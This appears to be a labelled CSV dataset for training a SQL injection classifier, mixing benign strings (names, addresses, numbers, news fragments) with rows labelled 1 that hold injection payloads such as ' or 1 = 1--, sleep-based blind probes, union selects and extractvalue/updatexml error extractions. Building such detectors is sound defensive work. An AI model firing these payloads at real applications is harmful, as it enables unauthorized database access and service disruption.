Sentence,Label
spindler1,0
mirna,0
" The vast majority airliners qualify greater electronic device use new guidelines , Huerta said ",0
vilafant,0
6470509098489788,0
1  )  )   )  and 9575 = 1640--,1
"1"" or sleep ( 5 )  and ""telb"" = ""telb",1
dept.,0
' or 1 = 1--,1
"-4756""  )  )   union all select 6846,6846,6846,6846,6846,6846,6846#",1
"c/ mineria, 151 13?g",0
" The Mayor considers right decision Winterlingen handed responsibility building someone else winter , thus longer pay upkeep building , heating , tending garden clearing pavement ",0
3916,0
0592934033194730,0
brocato,0
1'  )  )  ,1
"c/ tamesis 39, 1?c",0
8000,0
committe,0
0828132663978169,0
ch9let_a,0
sylvie@laspruebascongaseosa.pk,0
18518,0
1' )  as tvqn where 2967 = 2967,1
"1 where 1153 = 1153 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
1'  )  )   as pdrg where 5960 = 5960 and 9198 = 9198--,1
no3otr46,0
" In first three quarters year , increase 31% compared period year ",0
"1'  )  )   or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (  'gydh' = 'gydh",1
santa clara de avedillo,0
villalpando iturbide,0
7766,0
ajuagas,0
setabitano,0
"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'rpiz' like 'rpiz",1
"carretera industrial 149,",0
"1'  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'xzcr' = 'xzcr",1
kepinska@manuelpaloma.asia,0
6701924725777489,0
"1' in boolean mode )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) #",1
 Favre et al,0
"1""  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  ""bxct"" like ""bxct",1
"1%"" )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( ""%"" = """,1
nessa,0
9366583302251207,0
abbai,0
